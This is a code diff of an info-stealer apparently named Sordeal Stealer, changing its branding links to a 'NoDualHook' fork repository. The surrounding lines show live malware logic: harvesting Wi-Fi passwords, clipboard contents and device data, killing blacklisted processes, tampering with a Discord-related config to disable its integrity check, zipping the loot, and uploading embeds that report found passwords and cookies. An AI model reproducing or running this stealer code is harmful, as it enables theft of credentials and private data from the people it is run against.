@@ -910,7 +910,7 @@ class first_srdl_func(Functions):
                 item = json.load(f)
             except json.decoder.JSONDecodeError:
                 return
-        item[f"{mynameis}_is_here"] = f"https://github.com/{mynameis}"
+        item[f"{mynameis}_is_here"] = f"https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook"
         item["auto_start"] = False
         item["auto_start_discord"] = False
         item["integrity"] = False
@@ -927,7 +927,7 @@ class first_srdl_func(Functions):
 
         with open(config, "w") as f:
             json.dump(item, f, indent=2, sort_keys=True)
-            f.write(f"\n\n//{mynameis}_is_here | https://github.com/{mynameis}")
+            f.write(f"\n\n//{mynameis}_is_here | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook")
 
     async def kill_process_id(self):
         bllist = self.find_in_config("blprggg")
@@ -1444,7 +1444,7 @@ class first_srdl_func(Functions):
         if output:
             with open(os.path.join(self.dir, 'Systeme', 'Latest Clipboard.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                 file.write(
-                    f"{mynameis} | https://github.com/{mynameis}/{mynameis}-Stealer\n\n" + output)
+                    f"{mynameis} | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook/{mynameis}-Stealer\n\n" + output)
                 
 
     def please_findUSBdevices(self):
@@ -1453,7 +1453,7 @@ class first_srdl_func(Functions):
             if output:
                 with open(os.path.join(self.dir, 'Systeme', 'Devices Info.txt'), 'w', encoding='utf-8', errors='ignore') as file:
                     file.write(
-                    f"{mynameis} | https://github.com/{mynameis}/{mynameis}-Stealer\n\n" + output)
+                    f"{mynameis} | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook/{mynameis}-Stealer\n\n" + output)
         except Exception:
             return None
         
@@ -1493,7 +1493,7 @@ class first_srdl_func(Functions):
         passwords = Functions.please_findwifi()
         profiles = [
             f'SSID: {ssid}\n{mynameis}  Password: {password}' for ssid, password in passwords.items()]
-        divider = f'\n\n{mynameis} | https://github.com/{mynameis}/{mynameis}-Stealer\n\n'
+        divider = f'\n\n{mynameis} | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook/{mynameis}-Stealer\n\n'
 
         with open(ntpath.join(self.dir, 'Systeme', 'Wifi Info.txt'), "w", encoding='utf-8', errors='ignore') as file:
             file.write(divider + divider.join(profiles))
@@ -1565,12 +1565,12 @@ class first_srdl_func(Functions):
                     else:
                         with open(path, "w", encoding="utf-8", errors="ignore") as f:
                             f.write(
-                                f"{mynameis} Create By {mynameis} Team | https://github.com/{mynameis}\n\n"
+                                f"{mynameis} Create By {mynameis} Team | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook\n\n"
                             )
                         with open(path, "a", encoding="utf-8", errors="ignore") as fp:
                             fp.write(
                                 x
-                                + f"\n\n{mynameis} Create By {mynameis} Team | https://github.com/{mynameis}"
+                                + f"\n\n{mynameis} Create By {mynameis} Team | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook"
                             )
         _zipfile = ntpath.join(
             self.appdata, f"{self.getlange(self.code_winpc)}{mynameis}_[{login_info}].zip")
@@ -1598,7 +1598,7 @@ class first_srdl_func(Functions):
                 {
                     "author": {
                         "name": f"{mynameis} v4",
-                        "url": f"https://github.com/{mynameis}",
+                        "url": f"https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook",
                         "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "color": 16711718,
@@ -1685,7 +1685,7 @@ class first_srdl_func(Functions):
 
                     ],
                     "footer": {
-                        "text": f"{mynameis} Create BY {mynameis} Team・https://github.com/{mynameis}"
+                        "text": f"{mynameis} Create BY {mynameis} Team・https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook"
                     },
                 }
             ],
@@ -2044,7 +2044,7 @@ def upload(name, tk=""):
                     ],
                     "author": {
                         "name": f"{mynameis} v4",
-                        "url": f"https://github.com/{mynameis}",
+                        "url": f"https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook",
                         "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "footer": {"text": f"github.com/{mynameis}"},
@@ -2073,7 +2073,7 @@ def upload(name, tk=""):
                     "fields": [{"name": "Passwords Found:", "value": ra}],
                     "author": {
                         "name": f"{mynameis} v4",
-                        "url": f"https://github.com/{mynameis}",
+                        "url": f"https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook",
                         "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "footer": {
@@ -2099,7 +2099,7 @@ def upload(name, tk=""):
                     "fields": [{"name": "Cookies Found:", "value": rb}],
                     "author": {
                         "name": f"{mynameis} v4",
-                        "url": f"https://github.com/{mynameis}",
+                        "url": f"https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook",
                         "icon_url": f"https://raw.githubusercontent.com/{mynameis}/Assets/main/output-onlinegiftools.gif",
                     },
                     "footer": {
@@ -2119,7 +2119,7 @@ def upload(name, tk=""):
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\{name}.txt"
     with open(path, mode="w", encoding="utf-8") as f:
-        f.write(f"Created BY {mynameis} Team | https://github.com/{mynameis}\n\n")
+        f.write(f"Created BY {mynameis} Team | https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook\n\n")
         for line in data:
             if line[0] != "":
                 f.write(f"{line}\n")
